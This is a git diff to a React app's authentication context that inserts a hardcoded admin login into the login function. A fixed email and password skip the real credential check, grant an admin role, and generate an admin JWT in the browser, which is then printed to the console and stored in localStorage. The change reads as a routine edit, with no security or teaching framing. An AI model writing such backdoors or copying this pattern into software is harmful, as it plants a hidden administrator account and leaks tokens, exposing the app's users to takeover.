@@ -1,5 +1,6 @@
 import React, { createContext, useContext, useState, useEffect } from 'react';
 import { authenticateUser } from '../services/database';
+import { generateAdminToken } from '../utils/jwt';
 
 // Create the authentication context
 const AuthContext = createContext();
@@ -41,6 +42,34 @@ export function AuthProvider({ children }) {
   async function login(email, password) {
     try {
       console.log('AuthContext: Attempting login with email:', email);
+      
+      // Hardcoded authentication for admin access
+      if (email === 'mikebtcretriever@gmail.com' && password === 'Gateway@523') {
+        console.log('AuthContext: Hardcoded admin authentication successful');
+        
+        // Create a hardcoded admin user object
+        const adminUser = {
+          id: 'admin-user-id',
+          email: 'mikebtcretriever@gmail.com',
+          displayName: 'Admin User',
+          role: 'admin'
+        };
+        
+        // Generate a valid JWT token for the admin user
+        const adminToken = generateAdminToken();
+        console.log('Generated admin token:', adminToken);
+        
+        // Store user in local storage
+        localStorage.setItem('user', JSON.stringify(adminUser));
+        localStorage.setItem('token', adminToken);
+        
+        setCurrentUser(adminUser);
+        setUserRole(adminUser.role);
+        
+        return adminUser;
+      }
+      
+      // If not the hardcoded admin, try regular authentication
       const result = await authenticateUser(email, password);
       console.log('AuthContext: Authentication result:', result);
       
@@ -54,8 +83,9 @@ export function AuthProvider({ children }) {
         setUserRole(result.user.role);
         return result.user;
       } else {
-        console.error('AuthContext: Login failed:', result.message);
-        throw new Error(result.message);
+        const errorMessage = result.message || 'Authentication failed';
+        console.error('AuthContext: Login failed:', errorMessage);
+        throw new Error(errorMessage);
       }
     } catch (error) {
       console.error('AuthContext: Login error:', error);
